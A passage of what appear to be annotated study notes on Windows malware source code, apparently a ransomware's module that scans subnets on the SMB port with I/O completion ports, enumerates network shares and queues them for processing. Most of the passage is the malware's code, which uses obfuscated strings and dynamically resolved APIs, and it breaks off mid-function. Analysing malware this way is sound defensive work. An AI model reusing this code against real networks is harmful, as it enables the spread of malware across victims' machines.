  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- `network_scanner::PSHARE_INFO ShareInfo = TAILQ_FIRST(&amp;ShareList);`</span><br><span class="line">    - get the host&#x27;s shareinfo </span><br><span class="line">    </span><br><span class="line">- `threadpool::PutTask(threadpool::NETWORK_THREADPOOL, ShareInfo-&gt;wszSharePath);`</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">STATIC</span><br><span class="line">DWORD</span><br><span class="line">WINAPI</span><br><span class="line">HostHandler(__in PVOID pArg)</span><br><span class="line">&#123;</span><br><span class="line">	network_scanner::SHARE_LIST ShareList;</span><br><span class="line">	TAILQ_INIT(&amp;ShareList);</span><br><span class="line"></span><br><span class="line">	while (TRUE) &#123;</span><br><span class="line"></span><br><span class="line">		pEnterCriticalSection(&amp;g_CriticalSection);</span><br><span class="line"></span><br><span class="line">		PHOST_INFO HostInfo = TAILQ_FIRST(&amp;g_HostList);</span><br><span class="line">		if (HostInfo == NULL) &#123;</span><br><span class="line"></span><br><span class="line">			pLeaveCriticalSection(&amp;g_CriticalSection);</span><br><span class="line">			pSleep(1000);</span><br><span class="line">			continue;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		TAILQ_REMOVE(&amp;g_HostList, HostInfo, Entries);</span><br><span class="line">		pLeaveCriticalSection(&amp;g_CriticalSection);</span><br><span class="line"></span><br><span class="line">		if (HostInfo-&gt;dwAddres == STOP_MARKER) &#123;</span><br><span class="line"></span><br><span class="line">			free(HostInfo);</span><br><span class="line">			pExitThread(EXIT_SUCCESS);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		network_scanner::EnumShares(HostInfo-&gt;wszAddress, &amp;ShareList);</span><br><span class="line">		while (!TAILQ_EMPTY(&amp;ShareList))</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			network_scanner::PSHARE_INFO ShareInfo = TAILQ_FIRST(&amp;ShareList);</span><br><span class="line">			logs::Write(OBFW(L&quot;Starting search on share %s.&quot;), ShareInfo-&gt;wszSharePath);</span><br><span class="line">			threadpool::PutTask(threadpool::NETWORK_THREADPOOL, ShareInfo-&gt;wszSharePath);</span><br><span class="line">			TAILQ_REMOVE(&amp;ShareList, ShareInfo, Entries);</span><br><span class="line">			free(ShareInfo);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		free(HostInfo);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pExitThread(EXIT_SUCCESS);</span><br><span class="line">	return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="CreateHostTable"><a href="#CreateHostTable" class="headerlink" title="CreateHostTable"></a>CreateHostTable</h3><ul>
<li>WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);<ul>
<li>socket with tcp</li>
</ul>
</li>
<li>bind<ul>
<li>The <strong>bind</strong> function associates a local address with a socket.</li>
</ul>
</li>
<li>CreateIoCompletionPort((HANDLE)ConnectCtx-&gt;s, g_IocpHandle, CONNECT_COMPLETION_KEY, 0)<ul>
<li>Creates an input&#x2F;output (I&#x2F;O) completion port and associates it with a specified file handle, or creates an I&#x2F;O completion port that is not yet associated with a file handle, allowing association at a later time.</li>
<li>If the function succeeds, the return value is the handle to an I&#x2F;O completion port</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">CreateHostTable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	PSUBNET_INFO SubnetInfo = TAILQ_FIRST(&amp;g_SubnetList);</span><br><span class="line">	<span class="keyword">if</span> (!SubnetInfo) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	BYTE bAddres[<span class="number">4</span>];</span><br><span class="line">	DWORD dwAddress;</span><br><span class="line">	RtlCopyMemory(bAddres, &amp;SubnetInfo-&gt;dwAddress, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (BYTE i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">		bAddres[<span class="number">3</span>] = i;</span><br><span class="line">		RtlCopyMemory(&amp;dwAddress, bAddres, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">		PCONNECT_CONTEXT ConnectCtx = (PCONNECT_CONTEXT)pGlobalAlloc(GPTR, <span class="keyword">sizeof</span>(CONNECT_CONTEXT));</span><br><span class="line">		<span class="keyword">if</span> (!ConnectCtx) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ConnectCtx-&gt;dwAddres = dwAddress;</span><br><span class="line">		ConnectCtx-&gt;State = NOT_CONNECTED;</span><br><span class="line">		ConnectCtx-&gt;s = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, WSA_FLAG_OVERLAPPED);</span><br><span class="line">		<span class="keyword">if</span> (ConnectCtx-&gt;s == INVALID_SOCKET) &#123;</span><br><span class="line"></span><br><span class="line">			pGlobalFree(ConnectCtx);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		SOCKADDR_IN SockAddr;</span><br><span class="line">		RtlSecureZeroMemory(&amp;SockAddr, <span class="keyword">sizeof</span>(SockAddr));</span><br><span class="line">		SockAddr.sin_family = AF_INET;</span><br><span class="line">		SockAddr.sin_port = <span class="number">0</span>;</span><br><span class="line">		SockAddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (pbind(ConnectCtx-&gt;s, (CONST SOCKADDR*) &amp; SockAddr, <span class="keyword">sizeof</span>(SockAddr)) != ERROR_SUCCESS) &#123;</span><br><span class="line"></span><br><span class="line">			pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">			pGlobalFree(ConnectCtx);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!pCreateIoCompletionPort((HANDLE)ConnectCtx-&gt;s, g_IocpHandle, CONNECT_COMPLETION_KEY, <span class="number">0</span>)) &#123;</span><br><span class="line"></span><br><span class="line">			pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">			pGlobalFree(ConnectCtx);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		TAILQ_INSERT_TAIL(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	TAILQ_REMOVE(&amp;g_SubnetList, SubnetInfo, Entries);</span><br><span class="line">	<span class="built_in">free</span>(SubnetInfo);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ScanHosts"><a href="#ScanHosts" class="headerlink" title="ScanHosts"></a>ScanHosts</h3><ul>
<li><p>ConnectEx</p>
<ul>
<li><p>The <strong>ConnectEx</strong> function establishes a connection to a specified socket, and optionally sends data once the connection is established. The <strong>ConnectEx</strong> function is only supported on connection-oriented sockets.</p>
<ul>
<li><p>&#96;&#96;&#96;<br>  LPFN_CONNECTEX LpfnConnectex;</p>
<p>  BOOL LpfnConnectex(<br>[in]           SOCKET s,<br>[in]           const sockaddr *name,<br>[in]           int namelen,<br>[in, optional] PVOID lpSendBuffer,<br>[in]           DWORD dwSendDataLength,<br>[out]          LPDWORD lpdwBytesSent,<br>[in]           LPOVERLAPPED lpOverlapped<br>  )<br>  {…}</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```c</span><br><span class="line">STATIC</span><br><span class="line">VOID</span><br><span class="line">ScanHosts()</span><br><span class="line">&#123;</span><br><span class="line">	PCONNECT_CONTEXT ConnectCtx = NULL;</span><br><span class="line">	TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">		DWORD dwBytesSent;</span><br><span class="line">		SOCKADDR_IN SockAddr;</span><br><span class="line">		RtlSecureZeroMemory(&amp;SockAddr, sizeof(SockAddr));</span><br><span class="line">		SockAddr.sin_family = AF_INET;</span><br><span class="line">		SockAddr.sin_port = htons(SMB_PORT);</span><br><span class="line">		SockAddr.sin_addr.s_addr = ConnectCtx-&gt;dwAddres;</span><br><span class="line"></span><br><span class="line">		if (g_ConnectEx(ConnectCtx-&gt;s, (CONST SOCKADDR*) &amp; SockAddr, sizeof(SockAddr), NULL, 0, &amp;dwBytesSent, (LPOVERLAPPED)ConnectCtx)) &#123;</span><br><span class="line"></span><br><span class="line">			ConnectCtx-&gt;State = CONNECTED;</span><br><span class="line">			AddHost(ConnectCtx-&gt;dwAddres);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		else if (WSA_IO_PENDING == WSAGetLastError()) &#123;</span><br><span class="line"></span><br><span class="line">			g_ActiveOperations++;</span><br><span class="line">			ConnectCtx-&gt;State = CONNECTING;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="AddHost"><a href="#AddHost" class="headerlink" title="AddHost"></a>AddHost</h3><ul>
<li>add the new-found host to the Host table</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">AddHost</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in DWORD dwAddres</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (g_HostEntry) &#123;</span><br><span class="line">		INT i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (g_HostEntry-&gt;h_addr_list[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			DWORD dwCurrentAddr = *(DWORD*)g_HostEntry-&gt;h_addr_list[i++];</span><br><span class="line">			<span class="keyword">if</span> (dwCurrentAddr == dwAddres) &#123;</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PHOST_INFO HostInfo = (PHOST_INFO)m_malloc(<span class="keyword">sizeof</span>(HOST_INFO));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!HostInfo) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD dwAddress = INET_ADDRSTRLEN;</span><br><span class="line">	SOCKADDR_IN temp;</span><br><span class="line">	temp.sin_addr.s_addr = dwAddres;</span><br><span class="line">	temp.sin_port = <span class="number">0</span>;</span><br><span class="line">	temp.sin_family = AF_INET;</span><br><span class="line">	HostInfo-&gt;dwAddres = dwAddres;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (dwAddres != STOP_MARKER) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (SOCKET_ERROR == pWSAAddressToStringW((LPSOCKADDR)&amp;temp, <span class="keyword">sizeof</span>(temp), <span class="literal">NULL</span>, HostInfo-&gt;wszAddress, &amp;dwAddres)) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">free</span>(HostInfo);</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pEnterCriticalSection(&amp;g_CriticalSection); &#123;</span><br><span class="line"></span><br><span class="line">		TAILQ_INSERT_TAIL(&amp;g_HostList, HostInfo, Entries);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	pLeaveCriticalSection(&amp;g_CriticalSection);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PortScanHandler"><a href="#PortScanHandler" class="headerlink" title="PortScanHandler"></a>PortScanHandler</h3><p>this handler use the <code>CompletionStatus,IsTimerActivated,g_ActiveOperations</code> to control the code flow.</p>
<ul>
<li>g_ActiveOperations<ul>
<li>use to count the Socket.</li>
<li><code>ScanHosts</code> function: when one host is found ,the value is add by one</li>
<li>if <code>CompletionStatus == CONNECT_COMPLETION_KEY</code>, the value sub by one.</li>
</ul>
</li>
<li>IsTimerActivated<ul>
<li>used to check after the timer.<ul>
<li>IsTimerActivated is True,</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>four scenes</p>
<ol>
<li><p>CompletionStatus &#x3D;&#x3D; CONNECT_COMPLETION_KEY and CompleteAsyncConnect Success</p>
<ol>
<li><p>if g_ActiveOperations is zero ,then scanHost again</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!g_ActiveOperations &amp;&amp; IsTimerActivated) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<pre><code> if (Success &amp;&amp; CompleteAsyncConnect(ConnectContext-&gt;s)) &#123;
 
     ConnectContext-&gt;State = CONNECTED;
     AddHost(ConnectContext-&gt;dwAddres);
 
 &#125;
</code></pre>
</li>
</ol>
</li>
<li><p>CompletionStatus &#x3D;&#x3D; CONNECT_COMPLETION_KEY and CompleteAsyncConnect fail</p>
<ol>
<li>the same as before</li>
</ol>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">else &#123;</span><br><span class="line"></span><br><span class="line">			ConnectContext-&gt;State = NOT_CONNECTED;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>CompletionStatus &#x3D;&#x3D; TIMER_COMPLETION_KEY and g_ActiveOperations, so the connecting is Active.We can Cancel it now.</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (g_ActiveOperations) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = NULL;</span><br><span class="line">				TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">					if (ConnectCtx-&gt;State == CONNECTING) &#123;</span><br><span class="line">						pCancelIo((HANDLE)ConnectCtx-&gt;s);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><code>CompletionStatus == TIMER_COMPLETION_KEY and  g_ActiveOperations == 0</code> , the socket is out-of-time.</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">				pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">				pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">				TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">				pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			ScanHosts();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">				pExitThread(EXIT_FAILURE);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = FALSE;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>CompletionStatus </p>
<ul>
<li>A pointer to a variable that receives the completion key value associated with the file handle whose I&#x2F;O operation has completed. A completion key is a per-file key that is specified in a call to <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/FileIO/createiocompletionport">CreateIoCompletionPort</a>.<ul>
<li>START_COMPLETION_KEY</li>
<li>CONNECT_COMPLETION_KEY</li>
<li>TIMER_COMPLETION_KEY</li>
</ul>
</li>
</ul>
</li>
<li><p>PortScanHandler</p>
<ul>
<li>pGetQueuedCompletionStatus</li>
<li>pPostQueuedCompletionStatus</li>
<li>CancelIo<ul>
<li>Cancels all pending input and output (I&#x2F;O) operations that are issued by the calling thread for the specified file. The function does not cancel I&#x2F;O operations that other threads issue for a file handle.</li>
</ul>
</li>
<li>shutdown<ul>
<li>The <strong>shutdown</strong> function disables sends or receives on a socket.</li>
</ul>
</li>
</ul>
</li>
<li><p>TimerCallback</p>
<ul>
<li><pre><code class="c">  if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) &#123;
                  pExitThread(EXIT_FAILURE);
  &#125;
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- a callback function that used with PostQueuedCompletionStatus. </span><br><span class="line"></span><br><span class="line">- ```c</span><br><span class="line">    BOOL CreateTimerQueueTimer(</span><br><span class="line">      [out]          PHANDLE             phNewTimer,</span><br><span class="line">      [in, optional] HANDLE              TimerQueue,</span><br><span class="line">      [in]           WAITORTIMERCALLBACK Callback,</span><br><span class="line">      [in, optional] PVOID               Parameter,</span><br><span class="line">      [in]           DWORD               DueTime,</span><br><span class="line">      [in]           DWORD               Period,</span><br><span class="line">      [in]           ULONG               Flags</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
<li><p>The amount of time in milliseconds relative to the current time that must elapse before the timer is signaled for the first time.</p>
</li>
<li><p>so 30000 &#x2F; 1000 &#x3D; 30s, one call to the Callback function(TimerCallback),if connection is set then CancelIo it .if not ,then shutdown or close the socket</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">DWORD</span><br><span class="line">WINAPI</span><br><span class="line"><span class="title function_">PortScanHandler</span><span class="params">(PVOID pArg)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_ActiveOperations = <span class="number">0</span>;</span><br><span class="line">	HANDLE hTimer = <span class="literal">NULL</span>;</span><br><span class="line">	BOOL IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">	HANDLE hTimerQueue = pCreateTimerQueue();</span><br><span class="line">	<span class="keyword">if</span> (!hTimerQueue) &#123;</span><br><span class="line">		